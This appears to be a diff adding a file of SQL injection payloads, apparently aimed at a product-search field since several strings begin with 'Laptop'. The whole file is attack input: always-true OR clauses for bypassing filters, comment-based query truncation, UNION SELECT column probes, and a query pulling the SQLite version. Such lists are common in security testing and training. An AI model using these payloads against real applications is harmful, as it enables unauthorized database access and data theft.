@@ -1,0 +1,49 @@
+' OR '1'='1
+
+" OR "1"="1
+
+' OR 1=1 --
+
+" OR 1=1 --
+
+' OR true --
+
+" OR true --
+
+') OR ('1'='1
+
+") OR ("1"="1
+
+Laptop' --
+
+Laptop" --
+
+Laptop';--
+
+Laptop";--
+
+Laptop'#
+
+Laptop"#
+
+Laptop'/*
+
+Laptop"/*
+
+' UNION SELECT 1, 2, 3, 4 --
+
+" UNION SELECT 1, 2, 3, 4 --
+
+' UNION SELECT null, null, null, null --
+
+" UNION SELECT null, null, null, null --
+
+' UNION SELECT sqlite_version(), null, null, null -- (SQLite specific - try to get database version)
+
+" UNION SELECT sqlite_version(), null, null, null --
+
+
+
+' OR name LIKE 'Incredible%' --
+
+' OR name LIKE '%Toys%' --
